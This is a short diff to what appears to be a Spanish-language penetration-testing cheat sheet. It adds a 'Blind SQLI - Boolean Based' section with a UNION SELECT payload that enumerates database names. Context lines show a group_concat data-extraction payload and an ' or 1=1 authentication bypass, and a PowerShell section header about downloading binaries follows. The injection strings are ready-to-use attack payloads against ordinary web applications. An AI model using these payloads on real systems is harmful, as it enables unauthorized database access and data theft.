@@ -73,6 +73,13 @@ UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombr
 ```
 ' or 1=1 - --
 ```
+### Blind SQLI - Boolean Based
+
+Database enumeration brute force attack(sin sustituir ninguno de los numeros)
+```
+UNION SELECT 1,2,3 where database() like '%'; - --
+```
+
 # Powershell
 
 Descargar binarios
